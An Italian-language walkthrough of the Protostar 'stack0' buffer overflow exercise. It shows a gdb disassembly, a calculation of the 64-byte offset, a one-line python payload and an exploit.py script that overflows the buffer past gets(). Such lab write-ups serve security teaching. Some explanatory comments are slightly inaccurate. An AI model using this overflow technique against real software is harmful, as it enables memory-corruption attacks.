```` bash
proto@b92cf65f7998:/opt/protostar/bin$ gdb -q                                                      
(gdb) file stack0 
Reading symbols from stack0...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x60,%esp
   0x080483fd <+9>:	movl   $0x0,0x5c(%esp)
   0x08048405 <+17>:	lea    0x1c(%esp),%eax
   0x08048409 <+21>:	mov    %eax,(%esp)
   0x0804840c <+24>:	call   0x804830c <gets@plt>
   0x08048411 <+29>:	mov    0x5c(%esp),%eax
   0x08048415 <+33>:	test   %eax,%eax
   0x08048417 <+35>:	je     0x8048427 <main+51>
   0x08048419 <+37>:	movl   $0x8048500,(%esp)
   0x08048420 <+44>:	call   0x804832c <puts@plt>
   0x08048425 <+49>:	jmp    0x8048433 <main+63>
   0x08048427 <+51>:	movl   $0x8048529,(%esp)
   0x0804842e <+58>:	call   0x804832c <puts@plt>
   0x08048433 <+63>:	leave  
   0x08048434 <+64>:	ret
````
Nota bene che viene usata nel codice la gets()
````
0x0804840c <+24>:	call   0x804830c <gets@plt>
````
La gets viene messa a puntare dove inizia la variabile buffer, che risiede su 0x5c, quello che viene passato a gets è 0x1c, quindi per trovare la lunghezza del buffer fare 0x5c - 0x1c = 64
Quindi l'idea di buff overflow è A * 64 + 1
payload di attacco: 
```` bash
python3 -c 'print("A"*64 + str(1))' | ./stack0
````

**exploit.py**
```` python
import subprocess

junk = '\x41'    # Junk to overflow the buffer (gets())
fault = '1'      # Byte to create the segmentation fault

# Create the payload to break the binary
payload = junk * 64 + fault

# Create the process to run the binary
process = subprocess.Popen(["./stack0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# Execute the binary 
stdout, stderr = process.communicate(input=payload.encode()) 

print(stdout)
print(stderr)
````
